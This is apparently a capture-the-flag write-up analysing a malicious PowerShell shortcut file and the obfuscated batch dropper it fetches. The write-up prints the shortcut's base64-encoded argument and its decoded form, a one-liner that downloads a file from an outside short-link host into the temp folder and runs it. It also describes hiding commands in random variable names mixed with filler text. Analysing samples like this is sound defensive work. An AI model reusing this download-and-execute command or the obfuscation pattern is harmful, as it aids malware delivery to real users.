## Russian_roulette
So we are given the file `Windows PowerShell.lnk`, which we can assume is malicious due to the nature of the challenges. Lets try to avoid execution if possible. Using the `cat` command we can obtain base64 which we can easily decode.
```python
$cat Windows\ PowerShell.lnk

*snip*
powershell.exeh-g$�|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exeC:\Windows\system32�-e aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=
*snip*

$ echo -n "aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=" | base64 -d

iwr is.gd/jwr7JD -o $env:TMP/.cmd;& $env:TMP/.cmd
```
So looks like iwr (Invoke-WebRequest) is downloading from is.gd/jwr7JD to the /TMP directory. Following the URL and downloading the file yields `powershell.zip`. Sus name.
Lets see what we can enumerate before trying to execute or anything. Again using `cat` let's see if we get anything useful.
```python
��&cls
@echo off
set ucbw=set
:: Путешествия в воображении, как и путешествия в реальности, могут привести к удивительным открытиям и незабываемым встречам с персонажами, которые живут на грани воображаемого и реального.
%ucbw% qmy= 
*snip*
```
There is a **LOT** in this file, but upon inspection, it looks like obfuscated code is interlaced with Russian text. Delete the Russian, and it appears chars are being stored as variables with random names.
- delete russian ramblings, deobfuscate the ps script, which contains another base64 encoded value which then translates to ps running C# code
- cleaning up the C# code and executing it, provides the flag
